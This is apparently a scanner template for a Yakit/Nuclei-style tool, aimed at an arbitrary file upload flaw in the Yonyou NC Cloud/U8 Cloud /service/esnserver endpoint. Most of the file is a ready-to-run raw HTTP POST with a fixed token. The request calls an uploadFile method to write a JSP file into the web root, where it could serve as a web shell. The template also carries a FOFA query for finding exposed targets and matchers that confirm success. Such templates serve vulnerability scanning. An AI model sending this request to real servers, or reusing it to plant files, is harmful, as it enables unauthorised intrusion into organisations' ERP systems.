script_name: 用友NC Cloud service/esnserver接口存在任意文件上传漏洞
content:
info:
    name: 用友NC Cloud service/esnserver接口存在任意文件上传漏洞
    author: Harry
    severity: high
    description: |
    metadata:
        FOFA:app="用友-U8-Cloud"

http:
  - raw:
    - |
        POST /service/esnserver HTTP/1.1
        User-Agent:Mozilla/5.0(Windows NT 100.0;Win64; x64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/129.0.0.0Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept:*/*
        Connection: close
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded 
        Token: 469ce01522f64366750d1995ca119841 
        Content-Length: 579

        {"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"","p2":"webapps/u8c_web/mumuheiquan.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
    matchers:
      - type: dsl
        dsl:
            - 'status_code == 200'
            - 'contains(body, "\"code\":\"0\"")'
            - 'contains(body, "\"data\":true")'
            - 'contains(body, "\"desc\":\"成功\"")'
        condition: and
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
help: 用友NC Cloud service/esnserver接口存在任意文件上传漏洞
